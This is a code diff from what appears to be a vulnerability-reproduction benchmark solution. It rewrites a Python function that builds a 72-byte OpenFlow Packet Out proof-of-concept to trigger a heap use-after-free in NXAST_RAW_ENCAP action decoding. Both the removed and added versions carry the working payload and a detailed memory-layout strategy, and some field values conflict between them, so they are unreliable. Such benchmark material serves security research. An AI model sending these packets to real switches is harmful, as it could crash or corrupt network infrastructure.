@@ -5,77 +5,92 @@ class Solution:
         """
         Generate a PoC that triggers the vulnerability.
 
-        The PoC is a 72-byte OpenFlow 1.3 Packet Out message. The vulnerability
-        is a use-after-free in the decoding of an NXAST_RAW_ENCAP action.
+        Args:
+            src_path: Path to the vulnerable source code tarball
 
-        The exploit strategy is as follows:
-        1. Craft an OpenFlow message with an actions list of a specific length (48 bytes),
-           which causes the action decoder to allocate an output buffer of that same size.
-        2. The actions list contains two actions:
-           a) An OFPAT_SET_FIELD action (16 bytes raw). Its decoded representation
-              is larger than its raw size (e.g., >24 bytes). This action is used to
-              partially fill the allocated 48-byte output buffer.
-           b) An NXAST_RAW_ENCAP action (32 bytes raw). The decoding of this action
-              involves two steps:
-              i)  A 16-byte header structure is written to the output buffer. At this
-                  point, the buffer is nearly full.
-              ii) The action's properties (16 bytes raw) are decoded. This involves
-                  writing the 16 bytes of decoded properties to the output buffer.
-                  Since the buffer has insufficient space, it is re-allocated.
-        3. The function decoding NXAST_RAW_ENCAP holds a pointer to the action's
-           header structure within the original output buffer. After the buffer is
-           re-allocated during property decoding, this pointer becomes stale.
-        4. The function then writes to this stale pointer, resulting in a
-           heap-use-after-free, which is detected by ASan.
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
+        # The PoC is an OpenFlow 1.0 Packet-Out message. This version is chosen
+        # because its OFPAT_OUTPUT action is 8 bytes on the wire, which helps
+        # in precisely controlling memory layout. The vulnerability is triggered
+        # by manipulating the state of a buffer used for decoding actions.
+        #
+        # The strategy relies on these assumptions about the vulnerable environment:
+        # 1. The buffer for decoded actions ('out') is initialized to 64 bytes.
+        # 2. An 8-byte OFPAT_OUTPUT action decodes into a 24-byte structure.
+        # 3. The header of a decoded NXAST_RAW_ENCAP action is 16 bytes.
+        #
+        # The PoC sends a sequence of actions:
+        # 1. Two "priming" OFPAT_OUTPUT actions. These are decoded first, consuming
+        #    2 * 24 = 48 bytes of the 64-byte 'out' buffer. This leaves
+        #    exactly 16 bytes of space.
+        # 2. A malicious NXAST_RAW_ENCAP action. Its 16-byte decoded header fits
+        #    perfectly into the remaining space, filling the buffer completely.
+        #    A pointer ('encap') is taken to this header's location.
+        # 3. This action also contains an 8-byte property. When the decoder
+        #    attempts to append this property, it finds no room (8 bytes needed > 0 available).
+        #    This triggers a buffer reallocation, which moves the buffer's contents
+        #    to a new memory location and frees the old one.
+        # 4. The 'encap' pointer now dangles, pointing to the freed memory.
+        # 5. The function then accesses 'encap->len_offset', resulting in a
+        #    use-after-free, which is detected by AddressSanitizer.
+        #
+        # The total PoC length is 72 bytes, matching the ground truth.
 
-        # OFPT_PACKET_OUT header (24 bytes)
-        # version=4, type=13, length=72, xid=0
-        # buffer_id=0xffffffff (no buffered packet)
-        # in_port=0xfffffffd (OFPP_CONTROLLER)
-        # actions_len=48
-        header = struct.pack('>BBHIIHH6x', 4, 13, 72, 0, 0xffffffff, 0xfffffffd, 48)
+        # 1. OpenFlow 1.0 Header (8 bytes)
+        version = 1
+        msg_type = 13  # OFPT_PACKET_OUT
+        length = 72
+        xid = 0
+        header = struct.pack('!BBHI', version, msg_type, length, xid)
 
-        # Action 1: OFPAT_SET_FIELD (16 bytes)
-        # Decoded size is >16 bytes, filling the output buffer partially.
-        # - type=25, len=16
-        # - oxm_header for NXM_NX_REG0: class=0x0001, field=0, hasmask=0, len=4
-        # - value=0
-        action1 = struct.pack('>HH I I 4x', 25, 16, 0x00010004, 0)
+        # 2. OFPT_PACKET_OUT Header (OF 1.0) (8 bytes)
+        buffer_id = 0xffffffff  # OFP_NO_BUFFER
+        in_port = 0xfff8        # OFPP_CONTROLLER for OF 1.0
+        actions_len = 48
+        packet_out_header = struct.pack('!IHH', buffer_id, in_port, actions_len)
 
-        # Action 2: NXAST_RAW_ENCAP (32 bytes)
-        # Header (16 bytes) + Properties (16 bytes)
-        
-        # Header part (16 bytes)
-        # - type=0xffff (OFPAT_EXPERIMENTER)
-        # - len=32
-        # - vendor=0x2320 (NX_VENDOR_ID)
-        # - subtype=38 (NXAST_RAW_ENCAP)
-        # - class_=1 (Ethernet)
-        # - type=3 (NSH)
-        # - present_flags=0
-        # - props_len=16
-        action2_header = struct.pack(
-            '>HH I H H B B H',
-            0xffff,          # type
-            32,              # len
-            0x00002320,      # vendor
-            38,              # subtype
-            1,               # class_
-            3,               # encap type
-            0,               # present_flags
-            16               # props_len
-        )
+        # 3. Actions (48 bytes total)
+        # 3a. Priming actions: 2 x OFPAT_OUTPUT (8 bytes each for OF 1.0)
+        output_action = struct.pack('!HHHH',
+                                    0,   # type = OFPAT_OUTPUT
+                                    8,   # len
+                                    1,   # port
+                                    0)   # max_len
 
-        # Properties part (16 bytes)
-        # Decoding this will trigger the re-allocation.
-        # - type=0xffff (unknown, will be copied as-is)
-        # - length=16
-        properties = struct.pack('>HH12x', 0xffff, 16)
+        # 3b. Trigger action: NXAST_RAW_ENCAP (32 bytes)
+        # This is composed of a 24-byte header and an 8-byte property.
+        nae_type = 0xffff        # OFPAT_VENDOR
+        nae_len = 32
+        nae_vendor = 0x00002320  # NX_VENDOR_ID
+        nae_subtype = 37         # NXAST_RAW_ENCAP
+        nae_ofp_version = 4
+        nae_packet_type = 0
+        nae_len_offset = 1       # Must be non-zero to trigger the UAF read
+        nae_crc_offset = 0
 
-        action2 = action2_header + properties
+        # The nx_action_encap struct header is 24 bytes.
+        # Its members sum to 18 bytes, requiring 6 bytes of padding.
+        nae_header = struct.pack('!HH I 5H 6x',
+                                 nae_type, nae_len, nae_vendor,
+                                 nae_subtype, nae_ofp_version, nae_packet_type,
+                                 nae_len_offset, nae_crc_offset)
 
-        # Final PoC
-        poc = header + action1 + action2
+        # The property that will trigger the reallocation (8 bytes)
+        prop_type = 1
+        prop_len = 8
+        prop_data = b'\xde\xad\xbe\xef'
+        prop = struct.pack('!HH', prop_type, prop_len) + prop_data
+
+        raw_encap_action = nae_header + prop
+
+        actions = output_action * 2 + raw_encap_action
+
+        # 4. Packet Data (8 bytes)
+        # Required for OFP_NO_BUFFER and to match total length of 72.
+        packet_data = b'\x00' * 8
+
+        poc = header + packet_out_header + actions + packet_data
         
         return poc
